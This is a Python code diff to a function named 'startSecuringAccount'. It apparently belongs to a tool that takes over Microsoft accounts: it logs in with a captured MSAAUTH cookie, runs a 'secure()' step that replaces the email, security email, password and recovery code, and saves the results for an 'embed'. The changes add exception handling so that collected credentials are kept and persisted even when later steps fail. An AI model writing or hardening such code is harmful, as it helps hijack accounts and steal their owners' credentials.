@@ -20,7 +20,9 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
     
     account = {
         "microsoft": {
-            "email": "Couldn't Change!",
+            # Always seed with the email we logged in as — never leave
+            # "Couldn't Change!" if a later step fails before alias replace.
+            "email": email or "Couldn't Change!",
             "security_email": "Couldn't Change!",
             "password": "Couldn't Change!",
             "recovery_code": "Couldn't Change!",
@@ -77,14 +79,28 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
             
         case _:
             print(f"[+] - Got MSAAUTH")
-            await polish_host(session, msaauth)
+            try:
+                await polish_host(session, msaauth)
+            except Exception:
+                logging.exception("polish_host failed — continuing with existing cookies")
+                print("[!] - polish_host raised; continuing with existing cookies")
             print(f"[~] - Polished MSAAUTH")
-            account = await secure(
-                session = session, 
-                recovery = recovery,
-                account_info = account,
-                command = command
-            )
+            try:
+                account = await secure(
+                    session = session, 
+                    recovery = recovery,
+                    account_info = account,
+                    command = command
+                )
+            except Exception as exc:
+                logging.exception("secure() crashed after login for %s", email)
+                print(f"[X] - secure() crashed: {exc.__class__.__name__}: {exc}")
+                # Keep whatever credentials we already have in account_info
+                if not isinstance(account, dict):
+                    raise
+                account.setdefault("microsoft", {})
+                # Fall through to persist + embed with partial data
+                pass
 
     finalTime = (time.time() - initialTime)
 
